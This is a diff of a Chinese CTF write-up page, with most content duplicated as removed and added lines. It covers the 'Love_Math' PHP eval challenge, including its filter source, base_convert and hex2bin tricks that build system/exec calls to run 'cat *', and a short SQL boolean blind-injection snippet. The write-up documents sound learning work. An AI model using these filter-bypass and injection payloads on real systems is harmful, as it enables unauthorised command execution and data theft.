-</span><span class=c1></span>    <span class=nv>$whitelist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;abs&#39;</span><span class=p>,</span> <span class=s1>&#39;acos&#39;</span><span class=p>,</span> <span class=s1>&#39;acosh&#39;</span><span class=p>,</span> <span class=s1>&#39;asin&#39;</span><span class=p>,</span> <span class=s1>&#39;asinh&#39;</span><span class=p>,</span> <span class=s1>&#39;atan2&#39;</span><span class=p>,</span> <span class=s1>&#39;atan&#39;</span><span class=p>,</span> <span class=s1>&#39;atanh&#39;</span><span class=p>,</span> <span class=s1>&#39;base_convert&#39;</span><span class=p>,</span> <span class=s1>&#39;bindec&#39;</span><span class=p>,</span> <span class=s1>&#39;ceil&#39;</span><span class=p>,</span> <span class=s1>&#39;cos&#39;</span><span class=p>,</span> <span class=s1>&#39;cosh&#39;</span><span class=p>,</span> <span class=s1>&#39;decbin&#39;</span><span class=p>,</span> <span class=s1>&#39;dechex&#39;</span><span class=p>,</span> <span class=s1>&#39;decoct&#39;</span><span class=p>,</span> <span class=s1>&#39;deg2rad&#39;</span><span class=p>,</span> <span class=s1>&#39;exp&#39;</span><span class=p>,</span> <span class=s1>&#39;expm1&#39;</span><span class=p>,</span> <span class=s1>&#39;floor&#39;</span><span class=p>,</span> <span class=s1>&#39;fmod&#39;</span><span class=p>,</span> <span class=s1>&#39;getrandmax&#39;</span><span class=p>,</span> <span class=s1>&#39;hexdec&#39;</span><span class=p>,</span> <span class=s1>&#39;hypot&#39;</span><span class=p>,</span> <span class=s1>&#39;is_finite&#39;</span><span class=p>,</span> <span class=s1>&#39;is_infinite&#39;</span><span class=p>,</span> <span class=s1>&#39;is_nan&#39;</span><span class=p>,</span> <span class=s1>&#39;lcg_value&#39;</span><span class=p>,</span> <span class=s1>&#39;log10&#39;</span><span class=p>,</span> <span class=s1>&#39;log1p&#39;</span><span class=p>,</span> <span class=s1>&#39;log&#39;</span><span class=p>,</span> <span class=s1>&#39;max&#39;</span><span class=p>,</span> <span class=s1>&#39;min&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_getrandmax&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_rand&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_srand&#39;</span><span class=p>,</span> <span class=s1>&#39;octdec&#39;</span><span class=p>,</span> <span class=s1>&#39;pi&#39;</span><span class=p>,</span> <span class=s1>&#39;pow&#39;</span><span class=p>,</span> <span class=s1>&#39;rad2deg&#39;</span><span class=p>,</span> <span class=s1>&#39;rand&#39;</span><span class=p>,</span> <span class=s1>&#39;round&#39;</span><span class=p>,</span> <span class=s1>&#39;sin&#39;</span><span class=p>,</span> <span class=s1>&#39;sinh&#39;</span><span class=p>,</span> <span class=s1>&#39;sqrt&#39;</span><span class=p>,</span> <span class=s1>&#39;srand&#39;</span><span class=p>,</span> <span class=s1>&#39;tan&#39;</span><span class=p>,</span> <span class=s1>&#39;tanh&#39;</span><span class=p>];</span>
-    <span class=nx>preg_match_all</span><span class=p>(</span><span class=s1>&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;</span><span class=p>,</span> <span class=nv>$content</span><span class=p>,</span> <span class=nv>$used_funcs</span><span class=p>);</span>
-    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$used_funcs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=k>as</span> <span class=nv>$func</span><span class=p>)</span> <span class=p>{</span>
-        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$func</span><span class=p>,</span> <span class=nv>$whitelist</span><span class=p>))</span> <span class=p>{</span>
-            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;请不要输入奇奇怪怪的函数&#34;</span><span class=p>);</span>
-        <span class=p>}</span>
-    <span class=p>}</span>
-    <span class=c1>//帮你算出答案
-</span><span class=c1></span>    <span class=k>eval</span><span class=p>(</span><span class=s1>&#39;echo &#39;</span><span class=o>.</span><span class=nv>$content</span><span class=o>.</span><span class=s1>&#39;;&#39;</span><span class=p>);</span>
-<span class=p>}</span> 
-</code></pre></div><p>一上午都在懵逼，要么找到可以突破的数学函数，要么突破正则，应该就是这两种思路了。数学函数都看了一遍，貌似没有什么可以利用的函数。正则匹配<code>/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/</code>，这个是 <a class=link href=https://www.php.net/manual/zh/language.variables.basics.php target=_blank rel=noopener>php 变量文档</a>中匹配有效变量名的正则。感觉两个思路都不对…最有可能的还是突破数学函数…数组可以绕之前的，但是<code>eval</code>不能执行</p>
-<p>看了好几遍直到看到了<code>base_convert</code>可以在进制转换上做文章，而且根据<a class=link href=https://www.php.net/manual/zh/function.base-convert.php target=_blank rel=noopener>php文档&ndash;base_convert</a>，我们可以知道</p>
-<pre tabindex=0><code>frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。
-</code></pre><p>也就是第二位，第三位参数可以在 2 到 36 之间，而且高于十进制的用字母表示！既然拼接进去的都是字符串，转换出来拼接进去应该可以执行。</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001017.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001017.jpg loading=lazy>
-</a>
-</figure></p>
-<p>本地使用<code>base_convert(55490343972,10,36)()</code>成功执行<code>phpinfo</code>，远程也执行了<code>phpinfo</code>看看是不是有什么问题，看了一圈然而并没有发现什么问题。</p>
-<p>然后尝试使用各种执行命令</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>base_convert</span><span class=p>(</span><span class=mi>15941</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>36</span><span class=p>);</span>	<span class=c1>//cat
-</span><span class=c1></span><span class=nx>base_convert</span><span class=p>(</span><span class=mi>1751504350</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>10</span><span class=p>);</span>	<span class=c1>//system
-</span><span class=c1></span><span class=nx>base_convert</span><span class=p>(</span><span class=mi>696468</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>10</span><span class=p>);</span>	<span class=c1>//exec
-</span><span class=c1></span><span class=nx>base_convert</span><span class=p>(</span><span class=mi>784</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>10</span><span class=p>);</span>	<span class=c1>//ls
-</span><span class=c1></span><span class=nx>base_convert</span><span class=p>(</span><span class=mi>21269</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>10</span><span class=p>);</span>	<span class=c1>//GET
-</span></code></pre></div><p>虽然可以执行<code>ls</code>了，看到了<code>flag.php</code>，但是读不到就比较难受了。然后直接就考虑到了是不是可以有<code>cat *</code>这种操作，但是空格跟<code>*</code>都无法编码…这就比较头疼了。而且主要是还得全为数字，有字母的的话就会进<code>whitelist</code>的判断了。</p>
-<p>所以可能要尽量避免去使用十六进制什么的含有字母的，考虑到 ascii 码可以转换，又尝试了使用<code>chr</code>函数去转换</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=p>(</span><span class=nv>$pi</span><span class=o>=</span><span class=nx>base_convert</span><span class=p>(</span><span class=mi>9453</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>36</span><span class=p>))</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>120</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>99</span><span class=p>)(</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>99</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>97</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>116</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>42</span><span class=p>))</span>
-
-<span class=p>(</span><span class=nv>$pi</span><span class=o>=</span><span class=nx>base_convert</span><span class=p>(</span><span class=mi>9453</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>36</span><span class=p>))</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>120</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>99</span><span class=p>)(</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>108</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>115</span><span class=p>))</span>
-
-<span class=nv>$pi</span><span class=p>(</span><span class=mi>96</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>108</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>115</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>96</span><span class=p>)</span>
-</code></pre></div><p>一般的构造结果肯定不行…所以这里想用`ls`这种形式去执行命令，但是由于拼接的原因，一直不能执行…思路卡了很久。</p>
-<p>看了一些相关十六进制处理的函数，直到看到了两个函数，一个<code>hex2bin</code>函数，是可以把 16 进制转换成字符串，一个<code>dechex</code>函数，把十进制转换成十六进制。</p>
-<p>于是我们可以有</p>
-<pre tabindex=0><code>php &gt; echo base_convert('636174202a',16,10);
+</code></pre><p>这题比较可惜，时间不太够，比赛结束的40min多就做出来了&mldr;今天太困了，中午睡了好一会，时间足够的话肯定能搞出来的…可惜可惜。</p><p>最近看了还可以有</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>cot</span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>left</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=mi>1</span><span class=p>)</span><span class=o>&gt;</span><span class=s1>&#39;a&#39;</span><span class=p>);</span><span class=o>#</span><span class=w>
+</span></span></span></code></pre></div><p>这样的 bool 盲注的形式</p><h1 id=day-2>Day 2</h1><h2 id=web-1>Web</h2><h3 id=love_math>Love_Math</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>    <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>//例子 c=20-1
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$content</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$content</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>80</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;太长了不会算&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$blacklist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39; &#39;</span><span class=p>,</span> <span class=s1>&#39;\t&#39;</span><span class=p>,</span> <span class=s1>&#39;\r&#39;</span><span class=p>,</span> <span class=s1>&#39;\n&#39;</span><span class=p>,</span><span class=s1>&#39;\&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;&#34;&#39;</span><span class=p>,</span> <span class=s1>&#39;`&#39;</span><span class=p>,</span> <span class=s1>&#39;\[&#39;</span><span class=p>,</span> <span class=s1>&#39;\]&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$blacklist</span> <span class=k>as</span> <span class=nv>$blackitem</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nv>$blackitem</span> <span class=o>.</span> <span class=s1>&#39;/m&#39;</span><span class=p>,</span> <span class=nv>$content</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;请不要输入奇奇怪怪的字符&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=c1>//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$whitelist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;abs&#39;</span><span class=p>,</span> <span class=s1>&#39;acos&#39;</span><span class=p>,</span> <span class=s1>&#39;acosh&#39;</span><span class=p>,</span> <span class=s1>&#39;asin&#39;</span><span class=p>,</span> <span class=s1>&#39;asinh&#39;</span><span class=p>,</span> <span class=s1>&#39;atan2&#39;</span><span class=p>,</span> <span class=s1>&#39;atan&#39;</span><span class=p>,</span> <span class=s1>&#39;atanh&#39;</span><span class=p>,</span> <span class=s1>&#39;base_convert&#39;</span><span class=p>,</span> <span class=s1>&#39;bindec&#39;</span><span class=p>,</span> <span class=s1>&#39;ceil&#39;</span><span class=p>,</span> <span class=s1>&#39;cos&#39;</span><span class=p>,</span> <span class=s1>&#39;cosh&#39;</span><span class=p>,</span> <span class=s1>&#39;decbin&#39;</span><span class=p>,</span> <span class=s1>&#39;dechex&#39;</span><span class=p>,</span> <span class=s1>&#39;decoct&#39;</span><span class=p>,</span> <span class=s1>&#39;deg2rad&#39;</span><span class=p>,</span> <span class=s1>&#39;exp&#39;</span><span class=p>,</span> <span class=s1>&#39;expm1&#39;</span><span class=p>,</span> <span class=s1>&#39;floor&#39;</span><span class=p>,</span> <span class=s1>&#39;fmod&#39;</span><span class=p>,</span> <span class=s1>&#39;getrandmax&#39;</span><span class=p>,</span> <span class=s1>&#39;hexdec&#39;</span><span class=p>,</span> <span class=s1>&#39;hypot&#39;</span><span class=p>,</span> <span class=s1>&#39;is_finite&#39;</span><span class=p>,</span> <span class=s1>&#39;is_infinite&#39;</span><span class=p>,</span> <span class=s1>&#39;is_nan&#39;</span><span class=p>,</span> <span class=s1>&#39;lcg_value&#39;</span><span class=p>,</span> <span class=s1>&#39;log10&#39;</span><span class=p>,</span> <span class=s1>&#39;log1p&#39;</span><span class=p>,</span> <span class=s1>&#39;log&#39;</span><span class=p>,</span> <span class=s1>&#39;max&#39;</span><span class=p>,</span> <span class=s1>&#39;min&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_getrandmax&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_rand&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_srand&#39;</span><span class=p>,</span> <span class=s1>&#39;octdec&#39;</span><span class=p>,</span> <span class=s1>&#39;pi&#39;</span><span class=p>,</span> <span class=s1>&#39;pow&#39;</span><span class=p>,</span> <span class=s1>&#39;rad2deg&#39;</span><span class=p>,</span> <span class=s1>&#39;rand&#39;</span><span class=p>,</span> <span class=s1>&#39;round&#39;</span><span class=p>,</span> <span class=s1>&#39;sin&#39;</span><span class=p>,</span> <span class=s1>&#39;sinh&#39;</span><span class=p>,</span> <span class=s1>&#39;sqrt&#39;</span><span class=p>,</span> <span class=s1>&#39;srand&#39;</span><span class=p>,</span> <span class=s1>&#39;tan&#39;</span><span class=p>,</span> <span class=s1>&#39;tanh&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=nx>preg_match_all</span><span class=p>(</span><span class=s1>&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;</span><span class=p>,</span> <span class=nv>$content</span><span class=p>,</span> <span class=nv>$used_funcs</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$used_funcs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=k>as</span> <span class=nv>$func</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$func</span><span class=p>,</span> <span class=nv>$whitelist</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;请不要输入奇奇怪怪的函数&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=c1>//帮你算出答案
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>eval</span><span class=p>(</span><span class=s1>&#39;echo &#39;</span><span class=o>.</span><span class=nv>$content</span><span class=o>.</span><span class=s1>&#39;;&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> 
+</span></span></code></pre></div><p>一上午都在懵逼，要么找到可以突破的数学函数，要么突破正则，应该就是这两种思路了。数学函数都看了一遍，貌似没有什么可以利用的函数。正则匹配<code>/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/</code>，这个是 <a class=link href=https://www.php.net/manual/zh/language.variables.basics.php target=_blank rel=noopener>php 变量文档</a>中匹配有效变量名的正则。感觉两个思路都不对…最有可能的还是突破数学函数…数组可以绕之前的，但是<code>eval</code>不能执行</p><p>看了好几遍直到看到了<code>base_convert</code>可以在进制转换上做文章，而且根据<a class=link href=https://www.php.net/manual/zh/function.base-convert.php target=_blank rel=noopener>php文档&ndash;base_convert</a>，我们可以知道</p><pre tabindex=0><code>frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。
+</code></pre><p>也就是第二位，第三位参数可以在 2 到 36 之间，而且高于十进制的用字母表示！既然拼接进去的都是字符串，转换出来拼接进去应该可以执行。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001017.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001017.jpg loading=lazy></a></figure></p><p>本地使用<code>base_convert(55490343972,10,36)()</code>成功执行<code>phpinfo</code>，远程也执行了<code>phpinfo</code>看看是不是有什么问题，看了一圈然而并没有发现什么问题。</p><p>然后尝试使用各种执行命令</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>base_convert</span><span class=p>(</span><span class=mi>15941</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>36</span><span class=p>);</span>	<span class=c1>//cat
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>base_convert</span><span class=p>(</span><span class=mi>1751504350</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>10</span><span class=p>);</span>	<span class=c1>//system
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>base_convert</span><span class=p>(</span><span class=mi>696468</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>10</span><span class=p>);</span>	<span class=c1>//exec
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>base_convert</span><span class=p>(</span><span class=mi>784</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>10</span><span class=p>);</span>	<span class=c1>//ls
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>base_convert</span><span class=p>(</span><span class=mi>21269</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>10</span><span class=p>);</span>	<span class=c1>//GET
+</span></span></span></code></pre></div><p>虽然可以执行<code>ls</code>了，看到了<code>flag.php</code>，但是读不到就比较难受了。然后直接就考虑到了是不是可以有<code>cat *</code>这种操作，但是空格跟<code>*</code>都无法编码…这就比较头疼了。而且主要是还得全为数字，有字母的的话就会进<code>whitelist</code>的判断了。</p><p>所以可能要尽量避免去使用十六进制什么的含有字母的，考虑到 ascii 码可以转换，又尝试了使用<code>chr</code>函数去转换</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=p>(</span><span class=nv>$pi</span><span class=o>=</span><span class=nx>base_convert</span><span class=p>(</span><span class=mi>9453</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>36</span><span class=p>))</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>120</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>99</span><span class=p>)(</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>99</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>97</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>116</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>42</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>(</span><span class=nv>$pi</span><span class=o>=</span><span class=nx>base_convert</span><span class=p>(</span><span class=mi>9453</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>36</span><span class=p>))</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>120</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>99</span><span class=p>)(</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>108</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>115</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$pi</span><span class=p>(</span><span class=mi>96</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>108</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>115</span><span class=p>)</span><span class=o>.</span><span class=nv>$pi</span><span class=p>(</span><span class=mi>96</span><span class=p>)</span>
+</span></span></code></pre></div><p>一般的构造结果肯定不行…所以这里想用`ls`这种形式去执行命令，但是由于拼接的原因，一直不能执行…思路卡了很久。</p><p>看了一些相关十六进制处理的函数，直到看到了两个函数，一个<code>hex2bin</code>函数，是可以把 16 进制转换成字符串，一个<code>dechex</code>函数，把十进制转换成十六进制。</p><p>于是我们可以有</p><pre tabindex=0><code>php &gt; echo base_convert(&#39;636174202a&#39;,16,10);
 426836762666
 php &gt; echo hex2bin(dechex(426836762666));
 cat *
-</code></pre><p>这样我们就可以把<code>*</code>这个十六进制为<code>2a</code>的转成十进制纯数字的了。</p>
-<p>但是我们要怎么利用<code>hex2bin</code>呢，想到可以利用<code>base_convert</code>赋值变量的方式，找到最短的字符串<code>pi</code>，利用<code>$pi=base_convert(37907361743,10,36)</code>构造出<code>hex2bin</code>。</p>
-<p>而且还因为<code>echo</code>可以接受如下的拼接方式，例如</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>php</span> <span class=o>&gt;</span> <span class=k>echo</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=sb>`id`</span><span class=p>;</span>
-<span class=mi>1</span><span class=nx>uid</span><span class=o>=</span><span class=mi>501</span><span class=p>(</span><span class=nx>zedd</span><span class=p>)</span> <span class=nx>gid</span><span class=o>=</span><span class=mi>20</span><span class=p>(</span><span class=nx>staff</span><span class=p>)</span> <span class=nx>groups</span><span class=o>=</span><span class=mi>20</span><span class=p>(</span><span class=nx>staff</span><span class=p>),</span><span class=mi>12</span><span class=p>(</span><span class=nx>everyone</span><span class=p>),</span><span class=mi>61</span><span class=p>(</span><span class=nx>localaccounts</span><span class=p>),</span><span class=mi>79</span><span class=p>(</span><span class=nx>_appserverusr</span><span class=p>),</span><span class=mi>80</span><span class=p>(</span><span class=nx>admin</span><span class=p>),</span><span class=mi>81</span><span class=p>(</span><span class=nx>_appserveradm</span><span class=p>),</span><span class=mi>98</span><span class=p>(</span><span class=nx>_lpadmin</span><span class=p>),</span><span class=mi>501</span><span class=p>(</span><span class=nx>access_bpf</span><span class=p>),</span><span class=mi>701</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>sharepoint</span><span class=o>.</span><span class=nx>group</span><span class=o>.</span><span class=mi>1</span><span class=p>),</span><span class=mi>33</span><span class=p>(</span><span class=nx>_appstore</span><span class=p>),</span><span class=mi>100</span><span class=p>(</span><span class=nx>_lpoperator</span><span class=p>),</span><span class=mi>204</span><span class=p>(</span><span class=nx>_developer</span><span class=p>),</span><span class=mi>250</span><span class=p>(</span><span class=nx>_analyticsusers</span><span class=p>),</span><span class=mi>395</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>access_ftp</span><span class=p>),</span><span class=mi>398</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>access_screensharing</span><span class=p>),</span><span class=mi>399</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>access_ssh</span><span class=p>)</span>
-<span class=nx>php</span> <span class=o>&gt;</span> <span class=k>echo</span> <span class=mi>1</span><span class=p>,</span><span class=sb>`id`</span><span class=p>;</span>
-<span class=mi>1</span><span class=nx>uid</span><span class=o>=</span><span class=mi>501</span><span class=p>(</span><span class=nx>zedd</span><span class=p>)</span> <span class=nx>gid</span><span class=o>=</span><span class=mi>20</span><span class=p>(</span><span class=nx>staff</span><span class=p>)</span> <span class=nx>groups</span><span class=o>=</span><span class=mi>20</span><span class=p>(</span><span class=nx>staff</span><span class=p>),</span><span class=mi>12</span><span class=p>(</span><span class=nx>everyone</span><span class=p>),</span><span class=mi>61</span><span class=p>(</span><span class=nx>localaccounts</span><span class=p>),</span><span class=mi>79</span><span class=p>(</span><span class=nx>_appserverusr</span><span class=p>),</span><span class=mi>80</span><span class=p>(</span><span class=nx>admin</span><span class=p>),</span><span class=mi>81</span><span class=p>(</span><span class=nx>_appserveradm</span><span class=p>),</span><span class=mi>98</span><span class=p>(</span><span class=nx>_lpadmin</span><span class=p>),</span><span class=mi>501</span><span class=p>(</span><span class=nx>access_bpf</span><span class=p>),</span><span class=mi>701</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>sharepoint</span><span class=o>.</span><span class=nx>group</span><span class=o>.</span><span class=mi>1</span><span class=p>),</span><span class=mi>33</span><span class=p>(</span><span class=nx>_appstore</span><span class=p>),</span><span class=mi>100</span><span class=p>(</span><span class=nx>_lpoperator</span><span class=p>),</span><span class=mi>204</span><span class=p>(</span><span class=nx>_developer</span><span class=p>),</span><span class=mi>250</span><span class=p>(</span><span class=nx>_analyticsusers</span><span class=p>),</span><span class=mi>395</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>access_ftp</span><span class=p>),</span><span class=mi>398</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>access_screensharing</span><span class=p>),</span><span class=mi>399</span><span class=p>(</span><span class=nx>com</span><span class=o>.</span><span class=nx>apple</span><span class=o>.</span><span class=nx>access_ssh</span><span class=p>)</span>
-</code></pre></div><p>尽量取最短的，这里肯定我们就用<code>,</code>这个形式。</p>
-<p>所以大致思路就差不多出来了利用<code>base_convert</code>构造<code>hex2bin</code>，然后用最短的可以执行命令的<code>exec</code>函数去执行<code>cat *</code>的命令</p>
-<pre tabindex=0><code>$pi=base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(426836762666)))
-</code></pre><p>然而没成功&mldr;不知道哪里错了，感觉没道理&mldr;</p>
